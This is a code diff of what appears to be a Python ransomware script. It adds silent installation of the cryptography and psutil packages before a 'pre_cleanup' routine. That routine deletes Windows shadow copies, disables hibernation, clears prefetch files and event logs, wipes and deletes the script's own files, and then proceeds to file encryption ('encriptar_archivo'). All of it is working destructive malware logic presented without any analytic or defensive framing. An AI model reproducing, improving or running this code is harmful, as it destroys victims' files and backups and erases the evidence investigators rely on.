@@ -14,19 +14,47 @@ else:
 os.chdir(SCRIPT_DIR)
 
 
+def verificar_e_instalar_dependencias():
+    try:
+        import cryptography
+        import psutil
+        return True
+    except ImportError:
+        pass
+    
+    python_exe = os.path.join(SCRIPT_DIR, 'python_portable', 'python.exe')
+    if not os.path.exists(python_exe):
+        python_exe = sys.executable
+    
+    try:
+        pip_packages = ['cryptography', 'psutil']
+        for pkg in pip_packages:
+            subprocess.run([
+                python_exe, '-m', 'pip', 'install', pkg, '--quiet',
+                '--trusted-host', 'pypi.org',
+                '--trusted-host', 'files.pythonhosted.org'
+            ], capture_output=True, creationflags=0x08000000, timeout=180)
+        
+        import cryptography
+        import psutil
+        return True
+    except:
+        return False
+
+
 def pre_cleanup():
     try:
         subprocess.Popen(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], creationflags=0x08000000)
         subprocess.Popen(['wmic', 'shadowcopy', 'delete'], creationflags=0x08000000)
         subprocess.Popen(['powercfg', '-h', 'off'], creationflags=0x08000000)
-        subprocess.run([
+        subprocess.Popen([
             'reg', 'add',
             r'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management',
             '/v', 'ClearPageFileAtShutdown',
             '/t', 'REG_DWORD',
             '/d', '1',
             '/f'
-        ], capture_output=True, creationflags=0x08000000, timeout=10)
+        ], creationflags=0x08000000)
         subprocess.Popen(['powershell', '-w', 'h', '-nop', '-c', 'Remove-Item C:\\Windows\\Prefetch\\*.pf -Force'], creationflags=0x08000000)
         subprocess.Popen(['wevtutil', 'cl', 'Application'], creationflags=0x08000000)
         subprocess.Popen(['wevtutil', 'cl', 'System'], creationflags=0x08000000)
@@ -50,17 +78,20 @@ def auto_destruir_archivos():
         if os.path.exists(f):
             try:
                 size = os.path.getsize(f)
-                for pattern in [b'\\x00', b'\\xFF', os.urandom(size)]:
+                if size == 0:
+                    os.remove(f)
+                    continue
+                for pattern in [b'\\x00', b'\\xFF']:
                     with open(f, 'wb') as fw:
-                        if isinstance(pattern, bytes) and len(pattern) == 1:
-                            fw.write(pattern * size)
-                        else:
-                            fw.write(pattern)
+                        fw.write(pattern * size)
                         fw.flush()
                         os.fsync(fw.fileno())
                 os.remove(f)
             except:
-                pass
+                try:
+                    os.remove(f)
+                except:
+                    pass
 
 
 def cleanup_python_thread():
@@ -74,14 +105,9 @@ def cleanup_python_thread():
 
 def wipe_memory_aggressive():
     try:
-        junk = [os.urandom(10 * 1024 * 1024) for _ in range(50)]
-        del junk
         import gc
         for _ in range(10):
             gc.collect()
-        more_junk = [bytearray(5 * 1024 * 1024) for _ in range(30)]
-        del more_junk
-        gc.collect()
     except:
         pass
 
@@ -114,6 +140,9 @@ def encriptar_archivo(enc, ruta):
 
 def main():
     try:
+        if not verificar_e_instalar_dependencias():
+            sys.exit(1)
+        
         pre_cleanup()
         threading.Thread(target=cleanup_python_thread, daemon=True).start()
         os.chdir(SCRIPT_DIR)
